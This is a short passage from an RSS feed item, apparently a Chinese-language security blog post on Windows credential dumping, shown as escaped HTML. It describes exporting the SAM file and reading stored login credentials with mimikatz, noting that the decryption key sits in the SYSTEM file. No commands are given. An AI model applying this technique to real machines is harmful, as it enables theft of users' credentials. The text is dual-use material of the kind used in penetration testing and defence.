alt=&#34;image-20240910193419664&#34; style=&#34;zoom:100%;&#34; /&gt;&#xA;&lt;h4 id=&#34;离线读取本地sam文件&#34;&gt;离线读取本地SAM文件&lt;/h4&gt;&#xA;&lt;p&gt;将SAM文件导出并使用mimikatz加载并读取其中的用户登录凭据等信息，但微软为了提高SAM文件安全性，会对SAM文件使用密钥加密，该密钥存储于于SAM同目录下的SYSTEM文件中&lt;/p&gt;</description>
    </item>
  </channel>
</rss>
